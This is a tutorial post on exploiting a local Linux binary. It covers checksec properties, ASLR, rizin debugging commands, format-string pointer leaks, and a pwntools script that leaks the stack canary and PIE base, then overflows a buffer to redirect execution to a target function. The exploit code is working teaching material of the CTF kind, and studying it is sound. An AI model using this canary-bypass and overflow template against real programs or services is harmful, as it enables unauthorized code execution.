## Prerequisites

This post uses “rizin” for dynamic analysis.  
And “pwntools” python package is useful for binary exploitation.

<br />

## Investigation

### Basic

```sh
file ./example
strings ./example

objdump -d ./example
# -M: type
objdump -M intel -d ./example
```

### Security Properties

First check the executable properties.

```sh
checksec --file=./example
```

- **RELRO (stands for Relocation Read-Only)**

    - **Partial RELRO** - We can read/write the global offset table.
    - **Full RELRO** - We can only read the global offset table. So we cannot overwrite GOT.
        
- **STACK CNARY**

    - **No canary found** - It’s vulnerable to buffer overflow.
        
- **NX (stands for Non-eXecutable segments)**

    - **NX enabled** - We cannot execute custom shellcode from the stack.
        
- **PIE (stands for Position Independent Executable)**

    - **No PIE** - The binary always starts at same address.

### ASLR (Address Space Layout Randomization) in Machine

ASLR is a security technique involved in preventing exploitation of memory corruption vulnerabilities.

```sh
cat /proc/sys/kernel/randomize_va_space
2
```

- **0** - The address space is NOT randomized.
- **1** - The address space is randomized.
- **2** - The address space is randomized, and data segment as well.

## Debugging

### 1. Start Debugger

```sh
# Change permission for debugging
chmod +x example

# -d: Debug mode
rizin -d example
```

### 2. Analyzing

```sh
# Analyze all calls, references, emulation and applies signatures
[0x0000]> aaa
```

### 3. List functions

```sh
# List functions
[0x0000]> afl
[0x0000]> afl | grep main
```

### 4. Disassemble & Decompile Functions

```sh
# Disassemble the function
[0x0000]> pdf @ main
[0x0000]> pd @ main
# Disassemble the first 50 lines
[0x0000]> pd 50 @ main

# Decompile the function (the ghidra plugin required)
[0x0000]> pdg @ main
```

If you want to decompile using “pdg” command as above, you need to install the “rizin-plugin-ghidra” so install it by running the following command.

```sh
sudo apt install rizin-plugin-ghidra
```

<br />

## Format String (Pointer)

```sh
./example

Type something:
>> %2$p
The result is 0x555a18ae6365
```

### Exploitation Examples

```sh
# Brute force pointer
for i in {20..-1}; do echo \%$i\$p | ./example; done

# Brute force pointer & cut & hexdump (reverse) & reverse
# cut -c 15-: Select only N characters (e.g. 15 characters)
# xxd -ps: Output in plain hexdump style
# xxd -r: Reverse operation. Convert hexdump into binary
# rev: Reverse lines characterwise
(for i in {11..6..-1}; do echo \%$i\$p | ./example; done) | grep "The result is" | cut -c 15- | xxd -ps -r | rev
```

<br />

## Bypass Canary Protection

```python
from pwn import *
import re

context.update(arch="amd64", os="linux")

filepath = "./example"
elf = context.binary = ELF(filepath)

p = process(filepath) # p = remote('example.com', '1337') for remote connection

# We need to find the stack canary. This address ends with "00".
# To find it, execute p.sendline(b"%p %p %p %p ...").
p.sendline(b"%10$p %13$p")
p.recvuntil(b"result: ")
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(base + 0x6fe)
payload += p64(elf.sym["target_func"])

p.sendline(payload)
p.interactive()
```
